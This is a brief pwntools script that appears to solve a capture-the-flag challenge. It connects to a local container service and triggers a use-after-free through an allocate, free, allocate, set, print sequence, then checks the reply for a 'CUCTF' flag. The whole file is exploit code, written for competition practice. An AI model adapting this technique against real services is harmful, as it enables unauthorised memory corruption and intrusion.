#!/usr/bin/env python2

from pwn import *

context.log_level = 'debug'
context.update(arch='amd64', os='linux')

def menu_allocate(letter):
    r.sendlineafter("$ ", "allocate {}".format(letter))

def menu_free(letter):
    r.sendlineafter("$ ", "free {}".format(letter))

def menu_set(letter):
    r.sendlineafter("$ ", "set {}".format(letter))

def menu_print(letter):
    r.sendlineafter("$ ", "print {}".format(letter))

r = remote("172.17.0.2", 9200)
menu_allocate("A")
menu_free("A")
menu_allocate("B")
menu_set("B")
menu_print("A")

try:
    res = r.recvline()
    if "CUCTF" not in res:
        log.failure("Exploit failed")
    else: log.success("Exploit succeeded")
except EOFError:
    log.failure("Exploit failed")
